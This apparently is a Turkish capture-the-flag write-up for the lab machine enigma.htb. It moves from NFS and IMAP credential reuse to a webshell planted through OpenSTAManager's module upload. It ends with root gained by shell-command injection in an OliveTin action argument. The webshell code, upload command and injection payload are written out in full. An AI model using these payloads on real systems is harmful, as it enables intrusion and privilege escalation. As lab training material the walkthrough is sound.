@@ -1,0 +1,166 @@
+Nmap ile tam port taraması yapıldı:
+
+```
+PORT    STATE SERVICE
+22/tcp  SSH
+80/tcp  HTTP (nginx 1.24.0)
+110/tcp POP3
+111/tcp rpcbind
+143/tcp IMAP
+993/tcp SSL/IMAP
+995/tcp SSL/POP3
+2049/tcp NFS
+```
+
+`/etc/hosts` dosyasına aşağıdaki sanal hostlar eklendi:
+```
+10.129.58.175  enigma.htb mail001.enigma.htb support_001.enigma.htb
+```
+
+---
+
+## NFS Erişimi — İlk Kimlik Bilgisi
+
+NFS servisi `/srv/nfs/onboarding` dizinini dışarıya açıyordu. Ancak dizin read-only ve içerik görünmüyordu. `pyNfsClient` kütüphanesi kullanılarak doğrudan dosya adıyla `lookup` yapıldı:
+
+```
+New_Employee_Access.pdf
+```
+
+PDF incelendiğinde:
+- **Çalışan:** * *  
+- **Kullanıcı adı:** *  
+- **Şifre:** `*`  
+- **URL:** `http://mail001.enigma.htb` (Roundcube webmail)
+
+---
+
+## IMAP — Admin Kimlik Bilgisi
+
+Kevin'ın şifresi (`*`) Sarah için de geçerliydi. Sarah'nın IMAP gelen kutusunda IT departmanından bir e-posta bulundu:
+
+```
+From: it@enigma.htb
+To: sarah@enigma.htb
+Subject: OpenSTAManager Access
+
+Username: *
+Password: *
+URL: http://support_001.enigma.htb
+```
+
+---
+
+## OpenSTAManager RCE — www-data Erişimi
+
+`support_001.enigma.htb` adresinde **OpenSTAManager v2.9.8** çalışıyordu. Güncelleme modülündeki (`upload_modules.php`) mantık hatası kullanıldı:
+
+ZIP dosyası yüklendiğinde, içinde `VERSION` dosyası varsa, tüm içerik web root'a kopyalanıyor:
+
+```php
+if (file_exists($extraction_dir.'/VERSION')) {
+    copyr($extraction_dir, base_dir()); // Tüm dosyaları web root'a kopyalar!
+}
+```
+
+Zararlı ZIP hazırlandı:
+- `VERSION` — Güncelleme akışını tetikler
+- `shell.php` — PHP webshell (`<?php system($_GET["cmd"]); ?>`)
+- `vendor/.gitkeep` — vendor rename hatasını önler
+
+Upload endpoint: `POST /controller.php?id_module=6` (op=upload, Content-Type: multipart/form-data)
+
+```bash
+curl -X POST "http://support_001.enigma.htb/controller.php?id_module=6" \
+  -H "Cookie: $SESSION" -F "op=upload" -F "blob=@webshell.zip"
+```
+
+Shell doğrulandı: `http://support_001.enigma.htb/shell.php?cmd=id`  
+→ `uid=33(www-data) gid=33(www-data)`
+
+---
+
+## User Flag
+
+OpenSTAManager veritabanı incelendi:
+
+```
+$db_username = '*';
+$db_password = '*';
+```
+
+```sql
+SELECT username, password FROM zz_users;
+-- haris: *
+```
+
+Hashcat ile kırıldı:
+```
+$2y$10$WHf... → *
+```
+
+```bash
+echo 'bestfriends' | su -c 'cat /home/haris/user.txt' haris
+```
+
+**User Flag:** `*`
+
+---
+
+## Privilege Escalation — Root
+
+### OliveTin Servisi Tespiti
+
+`/opt/OliveTin/` dizininde **OliveTin** (web tabanlı komut çalıştırma arayüzü) bulundu. Servis `root` olarak çalışıyordu ve `127.0.0.1:1337`'de dinliyordu:
+
+```
+/etc/systemd/system/OliveTin.service → ExecStart=/usr/local/bin/OliveTin (root)
+```
+
+`iptables` kuralları `www-data` (uid=33) kullanıcısının 1337 portuna bağlanmasını engelliyordu. Ancak `haris` (uid=1000) bu bağlantıyı yapabiliyordu.
+
+### OliveTin API — Command Injection
+
+OliveTin REST API'si `gRPC-web` kullanıyor ve endpoint `/api/StartAction`'dır. Alan adı `bindingId` (action ID'si):
+
+```bash
+# haris olarak OliveTin API'ye erişim
+echo 'bestfriends' | su -c 'curl -X POST http://127.0.0.1:1337/api/StartAction \
+  -H Content-Type:application/json \
+  -d "{\"bindingId\": \"date\"}"' haris
+```
+
+`backup_database` action'ı aşağıdaki komutu çalıştırıyor:
+```
+mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
+```
+
+`db_pass` alanı (`password` tipi) shell metacharacter doğrulaması yapmıyor. Injection:
+
+```json
+{
+  "bindingId": "backup_database",
+  "arguments": [
+    {"name": "db_user", "value": "backup_svc"},
+    {"name": "db_pass", "value": "' ; cp /bin/bash /tmp/rootbash ; chmod +s /tmp/rootbash ; echo '"},
+    {"name": "db_name", "value": "production"}
+  ]
+}
+```
+
+Çalıştırılan komut (root olarak):
+```
+mysqldump -u backup_svc -p'' ; cp /bin/bash /tmp/rootbash ; chmod +s /tmp/rootbash ; echo '' production...
+```
+
+SUID bash oluştu:
+```
+-rwsr-sr-x 1 root root /tmp/rootbash
+```
+
+Root flag okundu:
+```bash
+/tmp/rootbash -p -c 'cat /root/root.txt'
+```
+
+**Root Flag:** `*`
